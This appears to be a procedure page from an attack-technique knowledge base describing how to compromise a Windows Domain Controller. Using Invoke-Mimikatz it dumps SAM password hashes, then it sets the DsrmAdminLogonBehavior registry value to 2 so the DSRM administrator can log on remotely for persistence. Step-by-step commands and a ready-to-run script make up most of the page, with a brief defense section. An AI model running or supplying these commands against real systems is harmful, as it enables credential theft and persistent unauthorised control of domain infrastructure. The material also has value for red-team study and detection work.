---
id: 45a53e9c-7b59-436f-8749-7925c610fdeb
name: Dump-Local-Administrator-Hash-and-Activate-with-DSRM
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.504398+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/DSRM Credentials]]'
commands:
  - '[[commands/mimikatz-token-elevate-and-sam-dump]]'
  - '[[commands/get-dsrm-admin-logon-behavior]]'
  - '[[commands/new-dsrm-admin-logon-behavior-key]]'
  - '[[commands/set-dsrm-admin-logon-behavior-value]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Dump-Local-Administrator-Hash-and-Activate-with-DSRM

## Summary

This procedure uses Directory Services Restore Mode (DSRM) credentials to dump the local administrator password hash from the SAM database on a Windows Domain Controller and enables remote logon for the administrator account by modifying the DSRM logon behavior registry key. It allows attackers with DSRM access to gain persistent administrative privileges on the target system for lateral movement and data access.

## Description

DSRM is a special boot mode on Windows Servers for Active Directory maintenance, where a local administrator account (set during DC promotion) provides access. Attackers who obtain DSRM credentials (often weak or default) can boot into this mode or use tools like Mimikatz to extract hashes while running. The procedure first elevates privileges and dumps the SAM hash using Mimikatz, revealing the local admin password in hash form for offline cracking. Then, it configures the registry at HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA\DsrmAdminLogonBehavior to value 2, allowing the local admin to log on remotely even when the DC is not in DSRM. This technique targets Domain Controllers in Active Directory environments, enabling full administrative access for persistence, privilege escalation, and network traversal. It assumes the attacker has initial access to run these commands on the target.

## Requirements

1. Valid DSRM credentials for the target Domain Controller.
2. Administrative privileges or ability to execute Mimikatz on the target system (e.g., via initial access like RDP or scheduled task).
3. Mimikatz tool available and executable on the target Windows Server (x64 architecture recommended).
4. PowerShell execution policy allowing script runs (bypass if needed).
5. Target environment: Windows Server 2008+ acting as a Domain Controller.

## Defense

- Implement strong, unique passwords for DSRM accounts and rotate them regularly using secure tools like ntdsutil.
- Monitor and log all DSRM account usage, including logons and registry changes to LSA keys via Windows Event Logs (Event ID 4624 for logons, 4657 for registry mods).
- Restrict remote access to Domain Controllers using Group Policy (e.g., deny RDP for local admins) and enable multi-factor authentication where possible.
- Deploy endpoint detection tools to alert on Mimikatz execution or LSASS access (e.g., via Sysmon EID 10 for process injection).
- Regularly audit DSRM configurations and disable unnecessary remote logon capabilities.

## Objectives

1. Extract the local administrator hash from the SAM for potential cracking and reuse.
2. Enable remote logon for the local administrator account using DSRM configuration changes.
3. Achieve persistent administrative access to the Domain Controller for lateral movement.
4. Facilitate privilege escalation to access sensitive Active Directory data.

## Instructions

### Step 1: Elevate Token and Dump SAM Hash

**Context**: Use Mimikatz to elevate privileges and extract the local administrator hash from the SAM database. This step requires Mimikatz to be run with sufficient access to LSASS.

**Command** ([[commands/mimikatz-token-elevate-and-sam-dump]]):
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

> This command elevates the current token to SYSTEM privileges and dumps the SAM hashes, including the local Administrator account. Run it from an elevated PowerShell prompt where Mimikatz.exe is in the PATH or current directory. If successful, it outputs hashes in a format suitable for cracking with tools like Hashcat.

### Step 2: Check DSRM Admin Logon Behavior Registry Key

**Context**: Query the registry to determine if the DSRM remote logon behavior is already configured. Value 0 (default) restricts logons to console only; we need to set it to 2 for remote access.

**Command** ([[commands/get-dsrm-admin-logon-behavior]]):
```powershell
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior
```

> This retrieves the current value of the DsrmAdminLogonBehavior DWORD. If the key does not exist, it will error; proceed to create it. Expected output shows the property value (e.g., DsrmAdminLogonBehavior : 0).

### Step 3: Create DSRM Logon Behavior Key if Missing

**Context**: If the registry key does not exist from Step 2, create it with the required value to enable remote logons for DSRM accounts.

**Command** ([[commands/new-dsrm-admin-logon-behavior-key]]):
```powershell
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD
```

> This creates the DWORD property with value 2 if it doesn't exist. Value 2 allows the DSRM admin to log on remotely via any method (e.g., RDP, WinRM). Run as administrator; no output if successful, or error if permissions denied.

### Step 4: Set DSRM Logon Behavior to Enable Remote Access

**Context**: Ensure the registry value is set to 2, overriding any existing configuration to activate remote logon for the local administrator.

**Command** ([[commands/set-dsrm-admin-logon-behavior-value]]):
```powershell
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

> This updates the DsrmAdminLogonBehavior value to 2. After this, reboot or log off/on may be needed for changes to take effect. Success is silent; verify with Step 2 command.

### Step 5: Execute Full Script for Automation

**Context**: For streamlined execution, run the complete PowerShell script that combines all steps. This assumes Mimikatz is available and handles the sequence atomically.

**Code** ([[codes/PowerShell-DSRM-Hash-Dump-and-Activation-Script]]):
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# Create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# Change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

> Save this as a .ps1 file and execute with PowerShell (e.g., powershell -ExecutionPolicy Bypass -File script.ps1). It dumps the hash first, then configures the registry. Handle errors manually if the key already exists (Step 3 may fail harmlessly).
